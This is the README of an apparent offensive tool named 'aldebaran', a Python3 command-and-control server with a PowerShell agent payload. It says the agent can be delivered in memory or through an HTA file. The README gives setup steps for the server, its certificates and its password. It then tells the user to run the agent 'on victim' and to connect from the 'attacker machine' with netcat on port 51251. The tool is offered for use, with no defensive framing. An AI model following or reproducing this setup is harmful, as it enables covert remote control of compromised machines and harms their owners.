# aldebaran

Python3 C2 server and agent payload.

uses HTTP protocol with checkin. Works in env with powershell constrained language mode.

Agent code can be delivered as in memory only or as is e.g in a hta file.

darma is the server side code in python3

darpa is the agent side code in powershell

# Installation

## Requirements
install requirements with pip3


## Certificates
you will have to create valid https certs.
Self signed certs wont work with powershell. will lose constrainedlanguagemode support to ignore ssl errors so use letsencrypt

use ```certbot certonly --manual -d 220.ip-54-37-16.eu -d 220.ip-54-37-16.eu --register-unsafely-without-email ```
and copy certs in same directory as "darma/listener.py"

you will have to create valid https certs.
change cert paths in "listener.py".  When server is deamonized its path will be changed to "/"

## Change payload url

Change payload to point to your server url

## Change password of c2 server
Change bcrpyt hash in "darma/command.py" with

```
#Python3
# To generate hash
# Mind the '\n'
password = b"super secret password\n"
hashed = bcrypt.hashpw(password, bcrypt.gensalt())
print(hashed)
```
## Serverside
To start server:

```
python3 darma/main.py
```
## Victim
run agent on victim


## Attacker machine
connect to server with netcat on port 51251 with attackers machine

```
nc ip_of_server 51251
```

enter password and menu will pop up

## Logging
logging can be found @ ```/var/log/aldebaran.log```


## TODO
### Persistence
### Error check in menu
### Install script
